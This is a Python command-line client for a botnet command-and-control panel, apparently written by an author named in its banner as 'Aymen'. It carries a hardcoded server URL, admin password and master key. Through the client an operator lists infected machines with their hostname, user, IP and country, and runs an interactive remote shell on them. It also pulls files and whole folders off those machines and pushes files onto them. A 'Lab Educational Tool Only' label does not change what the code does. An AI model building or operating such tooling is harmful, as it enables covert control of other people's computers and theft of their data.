#!/usr/bin/env python3
# ============================================================
# 🖥️  C2 CLI — Command Line Interface for C2 Panel
#     Auto-Install + Fixed Input + Windows-style Prompt
# ============================================================

import sys
import os
import subprocess
import importlib

# ════════════════════════════════════════════════════════════
# 🔧 AUTO-INSTALL DEPENDENCIES
# ════════════════════════════════════════════════════════════
def _enable_windows_ansi():
    """تفعيل ANSI colors فـ Windows Console"""
    if os.name != 'nt':
        return
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        # STD_OUTPUT_HANDLE = -11, ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass

_enable_windows_ansi()

def is_module_installed(module_name):
    try:
        importlib.import_module(module_name)
        return True
    except ImportError:
        return False

def pip_install(package):
    print("  [i]  Installing: " + package + " ...")
    cmds = [
        [sys.executable, '-m', 'pip', 'install', '--quiet', package],
        [sys.executable, '-m', 'pip', 'install', '--user', '--quiet', package],
    ]
    for cmd in cmds:
        try:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=180)
            if result.returncode == 0:
                print("  [OK] Installed: " + package)
                return True
        except Exception:
            continue
    try:
        result = subprocess.run(['pip', 'install', '--quiet', package],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=180)
        if result.returncode == 0:
            print("  [OK] Installed: " + package)
            return True
    except Exception:
        pass
    print("  [!!] Failed to install: " + package)
    return False

def ensure_dependencies():
    importlib.invalidate_caches()
    needed = []
    if not is_module_installed('requests'):
        needed.append('requests')
    if os.name == 'nt':
        if not is_module_installed('pyreadline3') and not is_module_installed('readline'):
            needed.append('pyreadline3')
    if not needed:
        return True

    print()
    print("  [i]  Missing dependencies detected:")
    for m in needed:
        print("       - " + m)
    print("  [i]  Auto-installing...")
    print()

    all_ok = True
    for pkg in needed:
        if not pip_install(pkg):
            all_ok = False

    if not all_ok:
        print()
        print("  [!!] Some packages failed to install.")
        print("  [i]  Try manually: pip install requests pyreadline3")
        print()
        return False

    print()
    print("  [OK] All dependencies installed!")
    print("  [i]  Restarting...")
    print()
    try:
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception:
        return True
    return True

ensure_dependencies()

# ════════════════════════════════════════════════════════════
# ✅ Imports — readline مهم قبل input()
# ════════════════════════════════════════════════════════════
READLINE_OK = False
try:
    import readline  # noqa
    READLINE_OK = True
except ImportError:
    try:
        import pyreadline3  # noqa
        READLINE_OK = True
    except ImportError:
        READLINE_OK = False

# إعداد readline باش يخدم مزيان
if READLINE_OK:
    try:
        readline.parse_and_bind('tab: complete')
        readline.parse_and_bind('set editing-mode emacs')
        # History file
        _histfile = os.path.join(os.path.expanduser('~'), '.c2cli_history')
        try:
            readline.read_history_file(_histfile)
        except Exception:
            pass
        import atexit
        try:
            atexit.register(readline.write_history_file, _histfile)
        except Exception:
            pass
    except Exception:
        pass

try:
    import requests
except ImportError:
    print()
    print("  [!] 'requests' still missing.")
    print("  Please: pip install requests")
    print()
    sys.exit(1)

import json
import base64
import time

# ════════════════════════════════════════════════════════════
# 🔑 CREDENTIALS
# ════════════════════════════════════════════════════════════
DEFAULT_SERVER   = "https://promal.aymenlinux.workers.dev"
DEFAULT_USER     = "admin"
DEFAULT_PASSWORD = "Kernal-X0-admin"
DEFAULT_MASTER   = "master-2026-aymen"

# ════════════════════════════════════════════════════════════
# 🎨 Colors
# ════════════════════════════════════════════════════════════
def _supports_color():
    if os.name == 'nt':
        return True  # فعلنا ANSI فوق
    return hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()

USE_COLOR = _supports_color()

class C:
    RED     = '\033[91m' if USE_COLOR else ''
    GREEN   = '\033[92m' if USE_COLOR else ''
    YELLOW  = '\033[93m' if USE_COLOR else ''
    BLUE    = '\033[94m' if USE_COLOR else ''
    MAGENTA = '\033[95m' if USE_COLOR else ''
    CYAN    = '\033[96m' if USE_COLOR else ''
    WHITE   = '\033[97m' if USE_COLOR else ''
    BOLD    = '\033[1m'  if USE_COLOR else ''
    DIM     = '\033[2m'  if USE_COLOR else ''
    RESET   = '\033[0m'  if USE_COLOR else ''

def c(text, color):
    return color + str(text) + C.RESET

# ════════════════════════════════════════════════════════════
# 🧹 Clear Screen
# ════════════════════════════════════════════════════════════
def clear_screen():
    try:
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()
    except Exception:
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
        except Exception:
            print('\n' * 60)

# ════════════════════════════════════════════════════════════
# 💾 Config
# ════════════════════════════════════════════════════════════
CONFIG_DIR  = os.path.join(os.path.expanduser('~'), '.c2cli')
CONFIG_FILE = os.path.join(CONFIG_DIR, 'config.json')

def load_config():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
    except Exception:
        pass
    return {}

def save_config(cfg):
    try:
        os.makedirs(CONFIG_DIR, exist_ok=True)
        with open(CONFIG_FILE, 'w') as f:
            json.dump(cfg, f, indent=2)
    except Exception:
        pass

# ════════════════════════════════════════════════════════════
# 📡 API Client
# ════════════════════════════════════════════════════════════
class C2Client:
    def __init__(self, server, session_token=None):
        self.server = server.rstrip('/')
        self.session = session_token
        self.req = requests.Session()
        if session_token:
            self.req.cookies.set('session', session_token)

    def _post(self, path, data, timeout=30):
        url = self.server + path
        headers = {'Content-Type': 'application/json'}
        if self.session:
            headers['Cookie'] = 'session=' + self.session
        try:
            r = self.req.post(url, json=data, headers=headers, timeout=timeout)
            try:
                return r.status_code, r.json()
            except Exception:
                return r.status_code, {'raw': r.text}
        except requests.exceptions.ConnectionError:
            return 0, {'error': 'Connection failed'}
        except requests.exceptions.Timeout:
            return 0, {'error': 'Timeout'}
        except Exception as e:
            return 0, {'error': str(e)}

    def _get(self, path, timeout=30):
        url = self.server + path
        headers = {}
        if self.session:
            headers['Cookie'] = 'session=' + self.session
        try:
            r = self.req.get(url, headers=headers, timeout=timeout)
            try:
                return r.status_code, r.json()
            except Exception:
                return r.status_code, {'raw': r.text}
        except requests.exceptions.ConnectionError:
            return 0, {'error': 'Connection failed'}
        except requests.exceptions.Timeout:
            return 0, {'error': 'Timeout'}
        except Exception as e:
            return 0, {'error': str(e)}

    def login(self, user, password):
        code, data = self._post('/api/login', {
            'user_field': user,
            'pass_field': password,
        })
        if code == 200 and data.get('status') == 'ok':
            cookie = self.req.cookies.get('session')
            if not cookie:
                for ck in self.req.cookies:
                    if ck.name == 'session':
                        cookie = ck.value
                        break
            self.session = cookie
            return True, cookie
        return False, data.get('message', 'Login failed')

    def list_bots(self):
        code, data = self._get('/api/all_bots')
        if code == 200 and isinstance(data, list):
            return True, data
        return False, data

    def bot_info(self, bot_id):
        code, data = self._get('/api/bot_info/' + requests.utils.quote(bot_id))
        if code == 200:
            return True, data
        return False, data

    def send_command(self, bot_id, cmd):
        code, data = self._post('/api/send_command', {'id': bot_id, 'cmd': cmd})
        if code == 200:
            return True, data
        return False, data

    def get_result(self, bot_id):
        code, data = self._get('/api/get_result/' + requests.utils.quote(bot_id))
        if code == 200:
            return True, data
        return False, data

    def pause_bot(self, bot_id):
        return self._post('/api/pause_bot', {'id': bot_id})

    def resume_bot(self, bot_id):
        return self._post('/api/resume_bot', {'id': bot_id})

    def pause_all(self):
        return self._post('/api/pause_all', {})

    def resume_all(self):
        return self._post('/api/resume_all', {})

    def delete_bot(self, bot_id):
        return self._post('/api/delete_bot', {'id': bot_id})

    def pin_bot(self, bot_id):
        return self._post('/api/pin_bot', {'id': bot_id})

    def list_files(self, bot_id, path):
        return self._post('/api/list_files', {'id': bot_id, 'path': path}, timeout=120)

    def download_file(self, bot_id, path):
        return self._post('/api/download_file', {'id': bot_id, 'path': path}, timeout=180)

    def upload_file(self, bot_id, path, b64_data):
        return self._post('/api/upload_file', {'id': bot_id, 'path': path, 'b64': b64_data}, timeout=180)

    def mkdir(self, bot_id, path):
        return self._post('/api/mkdir', {'id': bot_id, 'path': path})

    def shell_run(self, bot_id, cmd, timeout=120):
        ok, data = self.send_command(bot_id, cmd)
        if not ok:
            return False, data.get('message', 'Send failed'), None
        if data.get('status') == 'error':
            return False, data.get('message', 'Error'), None
        task_id = data.get('task_id')
        start = time.time()
        while time.time() - start < timeout:
            time.sleep(0.8)
            ok2, result = self.get_result(bot_id)
            if ok2 and result.get('output') and result.get('task_id') == task_id:
                return True, task_id, result.get('output')
        return False, task_id, 'Timeout'

# ════════════════════════════════════════════════════════════
# 🎨 UI  —  ✅ BANNER الجديد
# ════════════════════════════════════════════════════════════
def banner():
    print()
    print(c('  ╭─────────────────────────────────────────────────────────╮', C.MAGENTA))
    print(c('  │', C.MAGENTA) + '                                                         ' + c('│', C.MAGENTA))
    print(c('  │', C.MAGENTA) + c('   ░█▀▀░▀█▀░░░█▀▀░█░░░░░░█▀▀░█▀█░█▀█░▀█▀░█▀▄░█▀█░█░░        ', C.BOLD + C.RED) + c('│', C.MAGENTA))
    print(c('  │', C.MAGENTA) + c('   ░█░░░░█░░░░█░░░█░░░░░░█░░░█▀█░█▀▀░░█░░█▀▄░█▀█░█░░        ', C.BOLD + C.YELLOW) + c('│', C.MAGENTA))
    print(c('  │', C.MAGENTA) + c('   ░▀▀▀░▀▀▀░░░▀▀▀░▀▀▀░░░▀▀▀░▀░▀░▀░░░▀▀▀░▀░▀░▀░▀░▀▀▀        ', C.BOLD + C.GREEN) + c('│', C.MAGENTA))
    print(c('  │', C.MAGENTA) + '                                                         ' + c('│', C.MAGENTA))
    print(c('  ├─────────────────────────────────────────────────────────┤', C.MAGENTA))
    print(c('  │', C.MAGENTA) + c('   Version: 1.0.0   │   Status: ONLINE   │   Mode: CLI    ', C.WHITE) + c('│', C.MAGENTA))
    print(c('  │', C.MAGENTA) + c('   Author: Aymen    │   Lab Educational Tool Only       ', C.DIM) + c('│', C.MAGENTA))
    print(c('  ╰─────────────────────────────────────────────────────────╯', C.MAGENTA))
    print()

def print_ok(msg):    print(c('  [OK] ', C.GREEN) + msg)
def print_err(msg):   print(c('  [!!] ', C.RED) + msg)
def print_info(msg):  print(c('  [i]  ', C.CYAN) + msg)
def print_warn(msg):  print(c('  [~]  ', C.YELLOW) + msg)
def sep(): print(c('  ' + '-' * 60, C.DIM))

# ════════════════════════════════════════════════════════════
# 💻 Prompt Builder  —  ✅ FIXED
# ════════════════════════════════════════════════════════════
def build_prompt(cwd, bot_id):
    if not cwd or cwd == '?':
        return c(bot_id, C.GREEN) + c('> ', C.GREEN)

    # ✅ نقي المسافات والـ newlines
    cwd = cwd.strip().strip('\r\n')

    # كشف Windows: drive letter ولا backslash
    is_windows = (
        (len(cwd) >= 2 and cwd[1] == ':') or ('\\' in cwd)
    )

    if is_windows:
        # ✅ حيد غير الـ trailing slash/backslash بلا ما تخرب الجذر
        path = cwd.rstrip('/\\')
        # ✅ إلا ولينا drive letter بوحدها (C:) زيد الـ backslash
        if len(path) == 2 and path[1] == ':':
            path = path + '\\'
        elif not path:
            path = cwd
    else:
        path = cwd.rstrip('/')
        if not path:
            path = '/'

    return c(path, C.CYAN) + c('> ', C.GREEN)

# ════════════════════════════════════════════════════════════
# 📋 CLI
# ════════════════════════════════════════════════════════════
class CLI:
    def __init__(self):
        self.cfg = load_config()
        self.client = None
        self.server = self.cfg.get('server', DEFAULT_SERVER)
        self.token = self.cfg.get('token', '')
        self.current_bot = None

    def setup(self):
        banner()
        self.client = C2Client(self.server, self.token or None)

        if self.token:
            ok, data = self.client.list_bots()
            if ok:
                print_ok('Reusing saved session -> ' + self.server)
                return
            print_warn('Session expired, re-login...')

        print_info('Logging in to ' + self.server + '...')
        ok, result = self.client.login(DEFAULT_USER, DEFAULT_PASSWORD)

        if not ok:
            print_warn('Trying master key...')
            ok2, result2 = self.client.login('', DEFAULT_MASTER)
            if ok2:
                ok, result = True, result2

        if not ok:
            print_err('Login failed: ' + str(result))
            sys.exit(1)

        self.token = result
        self.cfg['server'] = self.server
        self.cfg['token'] = result
        save_config(self.cfg)
        print_ok('Logged in as ' + c(DEFAULT_USER, C.GREEN))

    def get_bot_by_partial(self, partial):
        if not partial:
            return None
        if self.current_bot and self.current_bot.lower().startswith(partial.lower()):
            return self.current_bot
        ok, bots = self.client.list_bots()
        if not ok:
            return None
        partial_lower = partial.lower()
        for b in bots:
            if b['id'].lower() == partial_lower:
                return b['id']
        for b in bots:
            if partial_lower in b['id'].lower():
                return b['id']
        return None

    # ═══════════════════════════════════════════════════════
    # 📄 HELP
    # ═══════════════════════════════════════════════════════
    def cmd_help(self, args):
        print()
        print(c('  ============ ALL COMMANDS ============', C.BOLD + C.CYAN))
        print()
        cmds = [
            ('list',                                   'List all bots'),
            ('online',                                 'List online bots'),
            ('info <bot>',                             'Show bot details'),
            ('shell <bot>',                            'Interactive shell'),
            ('run <bot> <cmd>',                        'Run single command'),
            ('ls <bot> <path>',                        'List files on bot'),
            ('install <bot> --file <path_in_bot>',     'Download FILE from bot'),
            ('install <bot> --folder <path_in_bot>',   'Download FOLDER from bot'),
            ('push <bot> --file <local> --to <remote>',   'Upload FILE to bot'),
            ('push <bot> --folder <local> --to <remote>', 'Upload FOLDER to bot'),
            ('pause <bot>',                            'Pause a bot'),
            ('resume <bot>',                           'Resume a bot'),
            ('pauseall',                               'Pause all bots'),
            ('resumeall',                              'Resume all bots'),
            ('pin <bot>',                              'Pin/unpin bot'),
            ('delete <bot>',                           'Delete a bot'),
            ('use <bot>',                              'Set default bot'),
            ('server [url]',                           'Show/change server'),
            ('logout',                                 'Logout'),
            ('clear',                                  'Clear screen'),
            ('help',                                   'Show this help'),
            ('exit / quit',                            'Exit CLI'),
        ]
        for name, desc in cmds:
            print('    ' + c(name.ljust(46), C.GREEN) + c(desc, C.DIM))
        print()

    # ═══════════════════════════════════════════════════════
    # 📋 LIST / ONLINE / INFO
    # ═══════════════════════════════════════════════════════
    def cmd_list(self, args):
        print_info('Fetching bots...')
        ok, bots = self.client.list_bots()
        if not ok:
            print_err('Failed: ' + str(bots))
            return
        if not bots:
            print_warn('No bots connected')
            return
        print()
        print(c('  =============== BOTS (' + str(len(bots)) + ') ===============', C.BOLD + C.CYAN))
        print()
        print(c('  {:<3} {:<30} {:<8} {:<18} {:<10}'.format('#', 'ID', 'STATUS', 'OS', 'PING'), C.BOLD))
        sep()
        for i, b in enumerate(bots, 1):
            status = c('ONLINE ', C.GREEN) if b.get('isOnline') else c('OFFLINE', C.RED)
            if b.get('paused'):
                status = c('PAUSED ', C.YELLOW)
            os_str = (b.get('os') or '?')[:16]
            ping = b.get('ping')
            ping_str = str(ping) + 'ms' if ping else '---'
            bid = b.get('id', '?')[:28]
            pin = c('* ', C.YELLOW) if b.get('pinned') else '  '
            print('  ' + pin + c(str(i).ljust(3), C.DIM) + c(bid.ljust(30), C.WHITE) + ' ' + status + ' ' + c(os_str.ljust(18), C.DIM) + ' ' + c(ping_str, C.CYAN))
        print()

    def cmd_online(self, args):
        ok, bots = self.client.list_bots()
        if not ok:
            print_err('Failed')
            return
        online = [b for b in bots if b.get('isOnline') and not b.get('paused')]
        if not online:
            print_warn('No online bots')
            return
        print()
        print(c('  === ONLINE (' + str(len(online)) + ') ===', C.BOLD + C.GREEN))
        print()
        for b in online:
            print('    ' + c('* ', C.GREEN) + c(b['id'], C.WHITE) + '  ' + c(b.get('os', '?')[:20], C.DIM))
        print()

    def cmd_info(self, args):
        if not args:
            print_err('Usage: info <bot>')
            return
        bot_id = self.get_bot_by_partial(args[0])
        if not bot_id:
            print_err('Bot not found: ' + args[0])
            return
        ok, data = self.client.bot_info(bot_id)
        if not ok:
            print_err('Failed')
            return
        print()
        print(c('  === BOT INFO ===', C.BOLD + C.CYAN))
        print()
        keys = ['id', 'hostname', 'user', 'os', 'ip', 'country', 'cwd', 'isOnline', 'paused', 'ping', 'pendingCommands', 'pinned']
        for k in keys:
            v = data.get(k, '?')
            if k == 'isOnline':   v = c('YES', C.GREEN) if v else c('NO', C.RED)
            elif k == 'paused':   v = c('YES', C.YELLOW) if v else 'no'
            elif k == 'pinned':   v = c('* YES', C.YELLOW) if v else 'no'
            elif k == 'ping':     v = str(v) + 'ms' if v else '---'
            print('    ' + c(k.ljust(18), C.DIM) + ': ' + c(str(v), C.WHITE))
        print()

    # ═══════════════════════════════════════════════════════
    # ⌨️ SHELL
    # ═══════════════════════════════════════════════════════
    def cmd_shell(self, args):
        if not args:
            if self.current_bot:
                bot_id = self.current_bot
            else:
                print_err('Usage: shell <bot>')
                return
        else:
            bot_id = self.get_bot_by_partial(args[0])
            if not bot_id:
                print_err('Bot not found')
                return
        self.current_bot = bot_id
        print()
        print(c('  === SHELL: ' + bot_id + ' ===', C.BOLD + C.GREEN))
        print(c('  Type commands. "exit" to leave.', C.DIM))
        print()

        ok, info = self.client.bot_info(bot_id)
        cwd = info.get('cwd', '?') if ok else '?'

        while True:
            try:
                prompt = build_prompt(cwd, bot_id)
                line = input(prompt)
            except (EOFError, KeyboardInterrupt):
                print()
                break
            line = line.strip() if line else ''
            if not line:
                continue
            if line in ('exit', 'quit', 'q'):
                break
            if line == 'clear' or line == 'cls':
                clear_screen()
                continue
            if line == 'pwd' or line == 'cd':
                print('    ' + c(cwd, C.WHITE))
                continue
            print(c('    ... running', C.DIM))
            ok, tid, out = self.client.shell_run(bot_id, line)
            if ok and out:
                for l in out.split('\n'):
                    print('    ' + l)
                ok2, info2 = self.client.bot_info(bot_id)
                if ok2:
                    new_cwd = info2.get('cwd', cwd)
                    if new_cwd:
                        cwd = new_cwd
            else:
                print_err(str(out))
        print()
        print_info('Exited shell')

    def cmd_run(self, args):
        if len(args) < 2:
            print_err('Usage: run <bot> <command>')
            return
        bot_id = self.get_bot_by_partial(args[0])
        if not bot_id:
            print_err('Bot not found')
            return
        cmd = ' '.join(args[1:])
        print_info('Running on ' + bot_id + '...')
        ok, tid, out = self.client.shell_run(bot_id, cmd)
        if ok:
            for l in (out or '').split('\n'):
                print('  ' + l)
        else:
            print_err(str(out))

    # ═══════════════════════════════════════════════════════
    # 📂 LS
    # ═══════════════════════════════════════════════════════
    def cmd_ls(self, args):
        if len(args) < 2:
            print_err('Usage: ls <bot> <path>')
            return
        bot_id = self.get_bot_by_partial(args[0])
        if not bot_id:
            print_err('Bot not found')
            return
        path = args[1]
        print_info('Listing ' + path + '...')
        ok, data = self.client.list_files(bot_id, path)
        if not ok or data.get('status') != 'ok':
            print_err(str(data))
            return
        files = data.get('files', [])
        if not files:
            print_warn('Empty folder')
            return
        print()
        print(c('  {:<6} {:<40} {:<12}'.format('TYPE', 'NAME', 'SIZE'), C.BOLD))
        sep()
        for f in files:
            typ = c('[DIR] ', C.CYAN) if f['type'] == 'dir' else c('[FILE]', C.WHITE)
            size = str(f['size']) + 'B' if f['type'] == 'file' else ''
            print('  ' + typ + ' ' + c(f['name'][:38].ljust(40), C.WHITE) + ' ' + c(size, C.DIM))
        print()

    # ═══════════════════════════════════════════════════════
    # 📥 INSTALL
    # ═══════════════════════════════════════════════════════
    def cmd_install(self, args):
        if len(args) < 3:
            print_err('Usage:')
            print_err('  install <bot> --file <path_in_bot>')
            print_err('  install <bot> --folder <path_in_bot>')
            return

        bot_id = self.get_bot_by_partial(args[0])
        if not bot_id:
            print_err('Bot not found: ' + args[0])
            return

        mode = args[1]
        remote_path = ' '.join(args[2:])

        if mode == '--file':
            self._download_file(bot_id, remote_path)
        elif mode == '--folder':
            self._download_folder(bot_id, remote_path)
        else:
            print_err('Mode must be --file or --folder')

    def _download_file(self, bot_id, remote_path):
        print_info('Downloading FILE: ' + remote_path)
        ok, data = self.client.download_file(bot_id, remote_path)
        if not ok or data.get('status') != 'ok':
            print_err(str(data))
            return
        b64 = data.get('b64', '')
        if not b64:
            print_err('Empty file')
            return
        try:
            content = base64.b64decode(b64)
        except Exception as e:
            print_err('Decode error: ' + str(e))
            return
        fname = remote_path.split('/')[-1].split('\\')[-1] or 'download'
        out_dir = 'downloads'
        os.makedirs(out_dir, exist_ok=True)
        out_path = os.path.join(out_dir, fname)
        with open(out_path, 'wb') as f:
            f.write(content)
        print_ok('Saved: ' + out_path + '  (' + str(len(content)) + ' bytes)')

    def _download_folder(self, bot_id, remote_path):
        print_info('Downloading FOLDER: ' + remote_path)
        ok, data = self.client.list_files(bot_id, remote_path)
        if not ok or data.get('status') != 'ok':
            print_err('Cannot list: ' + str(data))
            return
        files = data.get('files', [])
        folder_name = remote_path.rstrip('/\\').split('/')[-1].split('\\')[-1] or 'folder'
        out_dir = os.path.join('downloads', folder_name)
        os.makedirs(out_dir, exist_ok=True)
        total = len([f for f in files if f['type'] == 'file'])
        if total == 0:
            print_warn('No files in folder')
            return
        print_info('Downloading ' + str(total) + ' files...')
        done = 0
        for f in files:
            if f['type'] != 'file':
                continue
            fpath = remote_path.rstrip('/\\') + '/' + f['name']
            ok2, d2 = self.client.download_file(bot_id, fpath)
            if ok2 and d2.get('status') == 'ok':
                try:
                    content = base64.b64decode(d2['b64'])
                    with open(os.path.join(out_dir, f['name']), 'wb') as fh:
                        fh.write(content)
                    done += 1
                    print('    ' + c('[OK]', C.GREEN) + ' ' + f['name'])
                except Exception as e:
                    print('    ' + c('[!!]', C.RED) + ' ' + f['name'] + ' - ' + str(e))
            else:
                print('    ' + c('[!!]', C.RED) + ' ' + f['name'] + ' - failed')
        print_ok('Downloaded ' + str(done) + '/' + str(total) + ' files -> ' + out_dir)

    # ═══════════════════════════════════════════════════════
    # 📤 PUSH
    # ═══════════════════════════════════════════════════════
    def cmd_push(self, args):
        if len(args) < 5:
            print_err('Usage:')
            print_err('  push <bot> --file <local> --to <path_in_bot>')
            print_err('  push <bot> --folder <local> --to <path_in_bot>')
            return

        bot_id = self.get_bot_by_partial(args[0])
        if not bot_id:
            print_err('Bot not found: ' + args[0])
            return

        mode = args[1]

        try:
            to_idx = args.index('--to')
        except ValueError:
            print_err('Missing --to <path_in_bot>')
            return

        local_path = ' '.join(args[2:to_idx])
        remote_path = ' '.join(args[to_idx + 1:])

        if mode == '--file':
            self._upload_file(bot_id, local_path, remote_path)
        elif mode == '--folder':
            self._upload_folder(bot_id, local_path, remote_path)
        else:
            print_err('Mode must be --file or --folder')

    def _upload_file(self, bot_id, local, remote):
        if not os.path.isfile(local):
            print_err('Local file not found: ' + local)
            return
        print_info('Uploading FILE: ' + local + ' -> ' + remote)
        try:
            with open(local, 'rb') as f:
                b64 = base64.b64encode(f.read()).decode()
        except Exception as e:
            print_err('Read error: ' + str(e))
            return
        ok, data = self.client.upload_file(bot_id, remote, b64)
        if ok and data.get('status') == 'ok':
            print_ok('Uploaded: ' + remote)
        else:
            print_err(str(data))

    def _upload_folder(self, bot_id, local, remote):
        if not os.path.isdir(local):
            print_err('Local folder not found: ' + local)
            return
        print_info('Uploading FOLDER: ' + local + ' -> ' + remote)
        files = []
        for root, dirs, fnames in os.walk(local):
            for fn in fnames:
                full = os.path.join(root, fn)
                rel = os.path.relpath(full, local)
                files.append((full, rel))
        if not files:
            print_warn('No files in folder')
            return
        print_info('Uploading ' + str(len(files)) + ' files...')
        done = 0
        for full, rel in files:
            remote_path = remote.rstrip('/') + '/' + rel.replace('\\', '/')
            parent = os.path.dirname(remote_path)
            if parent:
                self.client.mkdir(bot_id, parent)
            try:
                with open(full, 'rb') as f:
                    b64 = base64.b64encode(f.read()).decode()
                ok, d = self.client.upload_file(bot_id, remote_path, b64)
                if ok and d.get('status') == 'ok':
                    done += 1
                    print('    ' + c('[OK]', C.GREEN) + ' ' + rel)
                else:
                    print('    ' + c('[!!]', C.RED) + ' ' + rel)
            except Exception as e:
                print('    ' + c('[!!]', C.RED) + ' ' + rel + ' - ' + str(e))
        print_ok('Uploaded ' + str(done) + '/' + str(len(files)) + ' files')

    # ═══════════════════════════════════════════════════════
    # ⏸️ PAUSE / RESUME / PIN / DELETE / USE
    # ═══════════════════════════════════════════════════════
    def cmd_pause(self, args):
        if not args:
            print_err('Usage: pause <bot>')
            return
        bot_id = self.get_bot_by_partial(args[0])
        if not bot_id:
            print_err('Bot not found')
            return
        ok, data = self.client.pause_bot(bot_id)
        if ok and data.get('status') == 'ok':
            print_ok('Bot paused: ' + bot_id)
        else:
            print_err(str(data))

    def cmd_resume(self, args):
        if not args:
            print_err('Usage: resume <bot>')
            return
        bot_id = self.get_bot_by_partial(args[0])
        if not bot_id:
            print_err('Bot not found')
            return
        ok, data = self.client.resume_bot(bot_id)
        if ok and data.get('status') == 'ok':
            print_ok('Bot resumed: ' + bot_id)
        else:
            print_err(str(data))

    def cmd_pauseall(self, args):
        ok, data = self.client.pause_all()
        if ok and data.get('status') == 'ok':
            print_ok('All bots paused')
        else:
            print_err(str(data))

    def cmd_resumeall(self, args):
        ok, data = self.client.resume_all()
        if ok and data.get('status') == 'ok':
            print_ok('All bots resumed')
        else:
            print_err(str(data))

    def cmd_pin(self, args):
        if not args:
            print_err('Usage: pin <bot>')
            return
        bot_id = self.get_bot_by_partial(args[0])
        if not bot_id:
            print_err('Bot not found')
            return
        ok, data = self.client.pin_bot(bot_id)
        if ok and data.get('status') == 'ok':
            state = 'pinned' if data.get('pinned') else 'unpinned'
            print_ok('Bot ' + state + ': ' + bot_id)
        else:
            print_err(str(data))

    def cmd_delete(self, args):
        if not args:
            print_err('Usage: delete <bot>')
            return
        bot_id = self.get_bot_by_partial(args[0])
        if not bot_id:
            print_err('Bot not found')
            return
        confirm = input(c('  Delete "' + bot_id + '"? [y/N]: ', C.YELLOW)).strip().lower()
        if confirm != 'y':
            print_info('Cancelled')
            return
        ok, data = self.client.delete_bot(bot_id)
        if ok and data.get('status') == 'ok':
            print_ok('Deleted: ' + bot_id)
        else:
            print_err(str(data))

    def cmd_use(self, args):
        if not args:
            print_err('Usage: use <bot>')
            return
        bot_id = self.get_bot_by_partial(args[0])
        if not bot_id:
            print_err('Bot not found')
            return
        self.current_bot = bot_id
        print_ok('Current bot: ' + bot_id)

    def cmd_server(self, args):
        if args:
            url = args[0]
            if not url.startswith('http'):
                url = 'https://' + url
            self.server = url
            self.cfg['server'] = url
            self.cfg['token'] = ''
            save_config(self.cfg)
            self.token = ''
            print_ok('Server changed -> ' + url)
            self.setup()
        else:
            print_info('Server: ' + self.server)

    def cmd_clear(self, args):
        clear_screen()
        banner()

    def cmd_logout(self, args):
        self.token = ''
        self.cfg['token'] = ''
        save_config(self.cfg)
        print_ok('Logged out')
        self.setup()

    # ═══════════════════════════════════════════════════════
    # 🎯 Dispatcher
    # ═══════════════════════════════════════════════════════
    def dispatch(self, line):
        parts = line.strip().split()
        if not parts:
            return True
        cmd = parts[0].lower()
        args = parts[1:]

        routes = {
            'help': self.cmd_help, '?': self.cmd_help,
            'list': self.cmd_list, 'bots': self.cmd_list,
            'online': self.cmd_online,
            'info': self.cmd_info,
            'shell': self.cmd_shell, 'sh': self.cmd_shell,
            'run': self.cmd_run,
            'ls': self.cmd_ls,
            'install': self.cmd_install, 'download': self.cmd_install,
            'push': self.cmd_push, 'upload': self.cmd_push,
            'pause': self.cmd_pause, 'stop': self.cmd_pause,
            'resume': self.cmd_resume, 'start': self.cmd_resume,
            'pauseall': self.cmd_pauseall,
            'resumeall': self.cmd_resumeall,
            'pin': self.cmd_pin,
            'delete': self.cmd_delete, 'del': self.cmd_delete,
            'use': self.cmd_use,
            'server': self.cmd_server,
            'clear': self.cmd_clear, 'cls': self.cmd_clear,
            'logout': self.cmd_logout,
        }
        if cmd in ('exit', 'quit', 'q'):
            print()
            print_info('Bye!')
            return False
        fn = routes.get(cmd)
        if not fn:
            print_err('Unknown command: ' + cmd)
            print_info('Type "help" for available commands')
            return True
        try:
            fn(args)
        except KeyboardInterrupt:
            print()
            print_warn('Interrupted')
        except Exception as e:
            print_err('Error: ' + str(e))
        return True

    # ═══════════════════════════════════════════════════════
    # ▶️ Run
    # ═══════════════════════════════════════════════════════
    def run(self):
        self.setup()
        print()
        print_info('Server: ' + c(self.server, C.CYAN))
        print_info('Type "help" for commands')
        if not READLINE_OK:
            print_warn('readline not available — arrow keys may not work')
        print()
        while True:
            try:
                prompt = c('c2', C.RED + C.BOLD) + c('> ', C.WHITE)
                if self.current_bot:
                    short = self.current_bot[:20]
                    prompt = c('c2', C.RED + C.BOLD) + c('(', C.DIM) + c(short, C.GREEN) + c(')> ', C.WHITE)
                line = input(prompt)
            except (EOFError, KeyboardInterrupt):
                print()
                print_info('Bye!')
                break
            try:
                if not self.dispatch(line):
                    break
            except KeyboardInterrupt:
                print()
                print_warn('Interrupted')

# ════════════════════════════════════════════════════════════
# 🚀 Main
# ════════════════════════════════════════════════════════════
def main():
    try:
        cli = CLI()
        cli.run()
    except KeyboardInterrupt:
        print()
        print_info('Bye!')
    except Exception as e:
        print_err('Fatal: ' + str(e))
        sys.exit(1)

if __name__ == '__main__':
    main()